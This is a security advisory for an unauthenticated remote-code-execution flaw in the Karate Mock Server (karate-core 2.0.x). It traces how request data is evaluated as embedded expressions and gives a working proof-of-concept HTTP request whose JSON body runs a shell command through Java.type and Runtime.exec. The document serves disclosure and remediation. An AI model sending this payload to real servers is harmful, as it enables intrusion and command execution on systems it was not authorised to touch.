# [H] Karate Mock Server RCE via embedded expression evaluation of request-derived data

## Summary
Severity: High
Advisory: GHSA-2c85-rfcc-g74j
CWE: CWE-95
Ecosystem: Maven
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P/U:Clear (CVSS_V4)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-2c85-rfcc-g74j
Type: github-advisory

## Affected
- Maven: `io.karatelabs:karate-core` — affected >=2.0.1 <2.1.0

## Details
### Summary

Karate Mock Server can execute embedded expressions found in attacker-controlled HTTP request data when a Mock Server feature assigns request-derived values such as `request`, `requestHeaders`, or `requestParams` to variables.

In affected scenarios, an unauthenticated remote attacker can place a Karate embedded expression such as `#(Java.type(...))` in the HTTP body, headers, or query parameters. The Mock Server then recursively processes that untrusted data as embedded expressions and evaluates it server-side, which can lead to arbitrary command execution under the privileges of the Karate Mock Server process.

This issue does not require the attacker to control the feature file. The vulnerable precondition is that the Mock Server feature uses request-derived data in a way that passes through Karate expression evaluation, for example:

```karate
* def body = request
* def hdrs = requestHeaders
* def params = requestParams
```

### Details

The issue is caused by a missing trust boundary between HTTP request-derived data and Karate feature-authored embedded expressions.

In `MockHandler`, the current HTTP request is stored and request-derived values are exposed to the Karate runtime. For example, the request body is made available through the `request` binding:

```java
// MockHandler.java
this.currentRequest = request;
request.processBody();

engine.put("request", (JsLazy) () ->
    currentRequest != null ? currentRequest.getBodyConverted() : null);
```

`HttpRequest.getBodyConverted()` converts attacker-controlled JSON request bodies into Java objects such as `Map<String, Object>`:

```java
// HttpRequest.java
public Object getBodyConverted() {
    ResourceType rt = getResourceType();
    if (rt != null && rt.isBinary()) { return body; }
    return HttpUtils.fromBytes(body, false, rt);
}
```

When a Mock Server feature contains a step such as:

```karate
* def body = request
```

the expression `request` is evaluated by `StepExecutor.executeDef()` through `evalKarateExpression()`:

```java
// StepExecutor.java
Object value = evalKarateExpression(expr);
runtime.setVariable(name, value);
```

Inside `evalKarateExpression()`, the evaluated value is processed as embedded-expression content if it is a `Map` or `List`:

```java
// StepExecutor.java
Object value = runtime.eval(wrapJsonLikeExpression(expr));
if (value instanceof Map || value instanceof List) {
    value = processEmbeddedExpressions(value, true);
}
```

This is the vulnerable trust-boundary violation. The `Map` originates from the attacker-controlled HTTP request body, but Karate recursively treats its string values as possible embedded expressions.

`processEmbeddedExpressions()` recursively walks nested maps/lists and sends string values to `processEmbeddedString()`:

```java
// StepExecutor.java
} else if (value instanceof String str) {
    return processEmbeddedString(str, lenient);
}
```

`processEmbeddedString()` treats strings of the form `#(...)` as embedded expressions and evaluates them:

```java
// StepExecutor.java
if (str.startsWith("#(") && str.endsWith(")")) {
    String expr = str.substring(2, str.length() - 1);
    try {
        return runtime.eval(expr);
```

Because the Karate runtime supports Java interop through `Java.type(...)`, attacker-controlled request data can reach Java class loading and command execution.

The same issue applies to other request-derived bindings, such as `requestHeaders` and `requestParams`, when a Mock Server feature assigns them or otherwise passes them through Karate expression evaluation.

The important point is that the attacker does not need to control the feature file. The feature author only needs to assign request-derived data such as `request`, `requestHeaders`, or `requestParams`; the framework then automatically performs embedded-expression evaluation on attacker-controlled data.


### PoC

A minimal vulnerable Mock Server feature is:

```karate
Feature: demo

Background:
* def responseHeaders = { 'Content-Type': 'application/json' }

Scenario: pathMatches('/api/echo')
* def body = request
* def response = { ok: true }
```

Start the Mock Server with the vulnerable feature:

```bash
java -cp "<karate-core-and-runtime-classpath>" io.karatelabs.Main mock -p 18080 -m vuln.feature
```
http body is here:
```http
POST /api/echo HTTP/1.1
Host: localhost:18080
Content-Type: application/json
Content-Length: 87

{"poc": "#(Java.type('java.lang.Runtime').getRuntime().exec('sh -c id>/tmp/success'))"}
```
<img width="1051" height="558" alt="image" src="https://github.com/user-attachments/assets/f12c4631-dd22-439c-a8df-c7243726c0c4" />


Additional verified vectors:

1. Body vector: triggered when the feature assigns `request`.
2. Header vector: triggered when the feature assigns `requestHeaders`.
3. Query parameter vector: triggered when the feature assigns `requestParams`.

These vectors demonstrate that the issue is not limited to a single HTTP input location. It affects request-derived data that is later passed through embedded expression processing.

### Impact

An unauthenticated remote attacker can execute arbitrary operating-system commands on a server running an affected Karate Mock Server scenario.

The impact depends on whether the Mock Server is reachable by untrusted users and whether the feature file assigns request-derived data such as `request`, `requestHeaders`, or `requestParams`. In that configuration, the attacker does not need credentials, user interaction, or control over the feature file.

This can result in full compromise of the Mock Server process, including confidentiality, integrity, and availability impact for files, environment variables, network access, and credentials available to that process.

### Tested versions

Confirmed on:

* `io.karatelabs:karate-core` v2.0.10
* main branch commit `dff68200d`, project version `2.0.11.RC1`

The same vulnerable code path appears to exist in v2.0.1 through v2.0.9.

I am not claiming v1.x as affected without independent verification.

### Suggested remediation

Karate should not automatically process embedded expressions inside data that originated from HTTP requests.

Possible fixes include:

1. Preserve a trust boundary for request-derived values such as `request`, `requestHeaders`, and `requestParams`, and skip `processEmbeddedExpressions` for those values.
2. Add a Mock Server safe mode that disables or restricts `Java.type()` / Java interop while processing request data.
3. Require an explicit opt-in step for evaluating embedded expressions inside request-derived data.
4. Add regression tests for body, header, and query parameter injection where `#(Java.type(...))` must remain inert data instead of being evaluated.

## References
- https://github.com/karatelabs/karate/security/advisories/GHSA-2c85-rfcc-g74j
- https://github.com/karatelabs/karate
